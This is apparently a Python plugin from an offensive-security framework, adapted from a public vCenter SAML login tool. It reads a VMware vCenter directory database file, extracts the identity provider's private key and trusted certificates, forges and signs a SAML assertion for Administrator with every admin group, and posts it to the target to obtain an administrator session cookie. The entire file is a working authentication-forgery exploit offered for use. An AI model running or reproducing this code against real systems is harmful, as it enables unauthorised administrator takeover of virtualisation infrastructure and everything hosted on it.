# -*-* coding:UTF-8
import ssl
import zlib
import base64
import socket
import bitstring
from lxml import etree
from string import printable
from datetime import datetime
from signxml import XMLSigner
import OpenSSL.crypto as crypto
from urllib.parse import urlparse, parse_qs
from dateutil.relativedelta import relativedelta


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["https://github.com/horizon3ai/vcenter_saml_login"],
        "description": "生成用于登录vCenter平台的cookie",
        "datetime": "2022-02-02"
    }

    @cli.options('path', desc="data.mdb路径(该文件位于/storage/db/vmware-vmdir)", default='{self.target.value}')
    @cli.options('ip', desc="IP地址", required=True)
    def file(self, path, ip) -> dict:
        with open(path, 'rb') as f:
            content = f.read()
        stream = bitstring.ConstBitStream(content)
        idp_cert = self.custom_get_idp_cert(stream)
        trusted_cert_1, domain = self.custom_get_trusted_cert1(stream)
        trusted_cert_2 = self.custom_get_trusted_cert2(stream)
        hostname = self.custom_get_hostname(ip)
        response = self.custom_saml_request(ip)
        template = self.custom_fill_template(hostname, ip, domain, response)
        sign = self.custom_build_sign(template, idp_cert, trusted_cert_1, trusted_cert_2)
        cookie = self.custom_get_admin_cookie(sign, ip)
        return {'login_cookie': cookie}

    def custom_build_sign(self, template, idp_cert, trusted_cert_1, trusted_cert_2):
        try:
            self.log.info('Signing the saml assertion')
            assertion_id = template.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
            signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
            signed_assertion = signer.sign(
                template, reference_uri=assertion_id,
                key=idp_cert,
                cert=[trusted_cert_1, trusted_cert_2],
            )
            return signed_assertion
        except:
            raise Exception('Failed signing the saml assertion')

    def custom_saml_request(self, ip):
        self.log.info(f'Initiating saml request with {ip}')
        r = self.request('get', url=f"https://{ip}/ui/login", allow_redirects=False)
        if r.status_code == 302:
            o = urlparse(r.headers["location"])
            sr = parse_qs(o.query)["SAMLRequest"][0]
            dec = base64.decodebytes(sr.encode("utf-8"))
            req = zlib.decompress(dec, -8)
            req = etree.fromstring(req)
            self.log.debug('Saml request success')
            return req
        raise Exception('Failed to initiating saml request')

    def custom_get_hostname(self, ip):
        self.log.info('Obtaining hostname from vCenter SSL certificate')
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 443))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
            cert_bin = s.getpeercert(True)
            x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_bin)
            hostname = x509.get_subject().CN
            self.log.debug(f'Found hostname {hostname} for {ip}')
            return hostname
        except:
            raise Exception(f'Failed to find the hostname for {ip}')

    def custom_fill_template(self, hostname, ip, domain, req):
        self.log.info('Fill in the SAML response template')
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3] + 'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3] + 'Z'
        template = \
            r"""<?xml version="1.0" encoding="UTF-8"?>
            <saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
              <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
              <saml2p:Status>
                <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
                <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
              </saml2p:Status>
              <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
                <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
                <saml2:Subject>
                  <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
                  <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                    <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
                  </saml2:SubjectConfirmation>
                </saml2:Subject>
                <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
                  <saml2:ProxyRestriction Count="10"/>
                  <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
                  <saml2:AudienceRestriction>
                    <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
                  </saml2:AudienceRestriction>
                </saml2:Conditions>
                <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
                  <saml2:AuthnContext>
                    <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
                  </saml2:AuthnContext>
                </saml2:AuthnStatement>
                <saml2:AttributeStatement>
                  <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
                  </saml2:Attribute>
                </saml2:AttributeStatement>
              </saml2:Assertion>
            </saml2p:Response>
            """
        template = template.replace("$VCENTER_IP", ip)
        template = template.replace("$VCENTER", hostname)
        template = template.replace("$DOMAIN", domain)
        template = template.replace("$ID", req.get("ID"))
        template = template.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        template = template.replace("$NOT_BEFORE", before)
        template = template.replace("$NOT_AFTER", after)
        template = etree.fromstring(template.encode("utf-8"))
        return template

    def custom_get_admin_cookie(self, sign, ip):
        self.log.info('Attempting to login vCenter with the signed SAML request')

        r = self.request(
            method='post',
            url=f"https://{ip}/ui/saml/websso/sso",
            allow_redirects=False,
            data={
                "SAMLResponse": base64.encodebytes(
                    etree.tostring(
                        sign,
                        xml_declaration=True,
                        encoding="UTF-8",
                        pretty_print=False
                    )
                ).decode()
            },
            timeout=(800, 800)
        )
        if r.status_code == 302:
            cookie = r.headers["Set-Cookie"].split(";")
            self.log.debug(f'Obtained Administrator cookie for {ip} success')
            res = {}
            for i in cookie:
                if 'VSPHERE-UI-JSESSIONID' in i:
                    k, v = i.split('=', 1)
                    res['VSPHERE-UI-JSESSIONID'] = v
                    return res
        raise Exception('Failed to obtained administrator cookie')

    def custom_get_trusted_cert2(self, stream):
        self.log.info('Start extracted trusted certificate 2')
        trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31'
        matches = stream.findall(trusted_cert2_flag)
        for match in matches:
            stream.pos = match - 10240
            try:
                start = stream.readto('0x308204', bytealigned=True)
            except:
                self.log.debug('Failed finding cert 2 with flag 1, looking for flag 2...')
                try:
                    start = stream.readto('0x308203', bytealigned=True)
                except:
                    raise Exception('Failed to find the trusted certificate 2')

            stream.pos = stream.pos - 40
            cert_size_hex = stream.read('bytes:2')
            cert_size = int(cert_size_hex.hex(), 16)
            cert_bytes = stream.read(f'bytes:{cert_size}')

            cert = self.custom_build_cert(cert_bytes)
            if self.custom_check_cert(cert):
                self.log.debug('Extracted trusted certificate 2 success')
                return cert
        raise Exception('Failed to find the trusted certificate 2')

    def custom_get_trusted_cert1(self, stream):
        self.log.info('Start extracted trusted certificate 1')
        trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' \
                             b'\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74' \
                             b'\x65\x43\x68\x61\x69\x6e\x73\x2c'
        matches = stream.findall(trusted_cert1_flag)
        if matches:
            for match in matches:
                stream.pos = match
                cn_end = stream.readto('0x000013', bytealigned=True)
                cn_end_pos = stream.pos

                stream.pos = match
                cn_len = int((cn_end_pos - match - 8) / 8)
                cn = stream.read(f'bytes:{cn_len}').decode()

                parts = cn.split(',')
                domain_parts = []
                for part in parts:
                    if part.lower().startswith('dc='):
                        domain_parts.append(part[3:])
                domain = '.'.join(domain_parts).strip()
                domain = ''.join(char for char in domain if char in printable)
                if domain:
                    self.log.debug(f'Found cn: {cn}')
                    self.log.debug(f'Found domain: {domain}')
                    cn = stream.readto(f'0x0002', bytealigned=True)

                    cert_size_hex = stream.read('bytes:2')
                    cert_size = int(cert_size_hex.hex(), 16)
                    cert_bytes = stream.read(f'bytes:{cert_size}')

                    if b'ssoserverSign' in cert_bytes:
                        cert = self.custom_build_cert(cert_bytes)
                        if self.custom_check_cert(cert):
                            self.log.debug('Extracted trusted certificate 1 success')
                            return cert, domain
        raise Exception('Failed to find the trusted certificate 1')

    def custom_get_idp_cert(self, stream):
        self.log.info('Start extracted the idp certificate')
        matches = stream.findall(b'\x30\x82\x04', bytealigned=True)
        for match in matches:
            stream.pos = match - 32
            flag = stream.read('bytes:3')
            if flag == b'\x00\x01\x04':
                size_hex = stream.read('bytes:1')
                size_hex = b'\x04' + size_hex
                size = int(size_hex.hex(), 16)
                cert_bytes = stream.read(f'bytes:{size}')
                if any(not_it in cert_bytes for not_it in [b'Engineering', b'California', b'object']):
                    continue

                cert = self.custom_build_key(cert_bytes)
                if self.custom_check_cert(cert):
                    self.log.debug('Extracted the IdP certificate success')
                    return cert
        raise Exception('Failed to find the idp certificate')

    @staticmethod
    def custom_check_cert(cert):
        lines = cert.splitlines()
        if lines[1].startswith('MI'):
            return True
        else:
            return False

    def custom_build_key(self, content):
        data = base64.encodebytes(content).decode("utf-8").rstrip()
        cert = f'-----BEGIN PRIVATE KEY-----\n{data}\n-----END PRIVATE KEY-----'
        self.log.debug(f'Extracted certificate:\n-----BEGIN PRIVATE KEY-----\n{data}\n-----END PRIVATE KEY-----')
        return cert

    def custom_build_cert(self, content):
        data = base64.encodebytes(content).decode("utf-8").rstrip()
        cert = f'-----BEGIN CERTIFICATE-----\n{data}\n-----END CERTIFICATE-----'
        self.log.debug(f'Extracted certificate:\n-----BEGIN CERTIFICATE-----\n{data}\n-----END CERTIFICATE-----')
        return cert
